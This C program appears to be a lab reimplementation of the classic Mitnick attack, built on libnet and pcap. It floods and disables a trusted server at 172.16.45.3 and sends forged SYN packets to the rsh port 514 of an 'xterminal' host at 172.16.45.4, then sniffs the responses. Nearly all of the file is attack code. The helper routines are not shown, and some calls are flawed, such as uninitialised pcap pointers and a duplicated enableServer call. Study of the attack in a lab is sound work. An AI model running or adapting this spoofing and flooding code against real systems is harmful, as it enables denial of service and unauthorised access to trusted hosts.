#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <unistd.h>
#include <pthread.h>
#include "flood.h"
#include "sender.h"
#include "packetsniffer.h"
#include <pcap/pcap.h>

int main()
{
 
    //Defining variables
    u_long server;
    u_long xterminal;
    u_long kevin;
    struct pcap_pkthdr **pkheader;
    libnet_t *l;  //Libnet Context
    const u_char **pkt_data;
    char errbuf[LIBNET_ERRBUF_SIZE];
    const u_char *packet;
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);

    if ( l == NULL ) {
    fprintf(stderr, "libnet initialization failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);

    //Retrieving IP by conversion
    if((server=libnet_name2addr4(l,"172.16.45.3", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in server ip conversion");
        exit(0);
    }    
    if((xterminal=libnet_name2addr4(l,"172.16.45.4", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in xterminal ip conversion");
        exit(0);
    }
    if((kevin=libnet_name2addr4(l,"172.16.45.2", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in kevin ip conversion");
        exit(0);        
    };



    //Server flood
    printf("\n Disabling server...");
    disableServer(l,kevin,server);

    pcap_t* des=packetSnifferInitialize();

    for(int i=0; i<2;i++)
    {
        //send packet
        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123456,(u_int32_t)1,NULL,0,TH_SYN);
        ipTagCreate(l,(u_int32_t)kevin,(u_int32_t)xterminal,NULL,(u_int32_t)0);
        sendPacket(l);
        usleep(100);
        printf("%d",pcap_next_ex(des, pkheader, pkt_data));
       

    }
    closePacketSniffer(des);
    printf("\n Enabling the server...");
    enableServer(l,kevin,server);

    //restore server
    enableServer(l,kevin,server);
    libnet_destroy(l);
    return 0;
}